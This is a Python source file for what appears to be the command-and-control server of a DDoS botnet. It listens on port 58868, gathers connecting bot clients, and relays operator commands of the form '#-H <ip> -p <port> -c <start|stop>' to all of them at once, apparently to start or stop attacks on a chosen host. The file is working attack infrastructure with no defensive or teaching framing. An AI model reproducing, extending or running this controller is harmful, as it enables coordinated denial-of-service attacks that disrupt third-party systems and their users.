import socket
import argparse
from threading import Thread

socketList = []
# Command format '#-H xxx.xxx.xxx.xxx -p xxxx -c <start|stop>'
# Send command
def sendCmd(cmd):
    print("Send command......")
    for sock in socketList:
        sock.send(cmd.encode('UTF-8'))

# Wait connect
def waitConnect(s):
    while True:
        sock, addr = s.accept()
        if sock not in socketList:
            socketList.append(sock)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 58868))
    s.listen(1024)
    t = Thread(target = waitConnect, args = (s, ))
    t.start()
    
    print('Wait at least a client connection!')
    while not len(socketList):
        pass
    print('It has been a client connection!')
    
    while True:
        print('=' * 50)
        print('The command format:"#-H xxx.xxx.xxx.xxx -p xxx -c <start>"')
        
        # Wait for input command
        cmd_str = input("Please input cmd:")
        if len(cmd_str):
            if cmd_str[0] == '#':
                sendCmd(cmd_str)

if __name__ == '__main__':
    main()